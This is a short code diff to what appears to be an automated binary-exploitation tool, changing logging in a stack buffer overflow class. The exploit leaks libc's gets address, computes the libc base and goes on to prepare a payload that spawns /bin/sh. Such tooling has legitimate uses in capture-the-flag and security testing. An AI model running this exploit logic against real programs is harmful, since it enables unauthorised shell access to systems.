@@ -102,7 +102,8 @@ class StackBufferOverflowVulnerability(Vulnerability):
         payload1 = sm.resolve(binary=0x0, libc=0x0)
 
         # clear out any pending stdout
-        conn.recv()
+        res = conn.recv()
+        logger.debug(f"Initial: {res}")
 
         # read libc location
         logger.info("Sending first payload")
@@ -110,17 +111,15 @@ class StackBufferOverflowVulnerability(Vulnerability):
 
         # Need to perform drain of non libc stuff
         if self.suffix:
-            conn.recvuntil(self.suffix)
+            res = conn.recvuntil(self.suffix)
+            logger.debug(f"Received suffix: {res}")
 
         # Now we are at the actual payload
         gets_location = conn.recvline()[:-1]
-        logger.info(gets_location)
+        logger.debug(f"gets_location: {gets_location}")
         gets_location = int.from_bytes(gets_location, byteorder='little')
         libcoffset = gets_location - self.libc.symbols["gets"]
         logger.info("Libc found at {}".format(hex(libcoffset)))
-
-        # clear out any pending stdout
-        conn.recv(timeout=1)
 
         # send /bin/sh
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
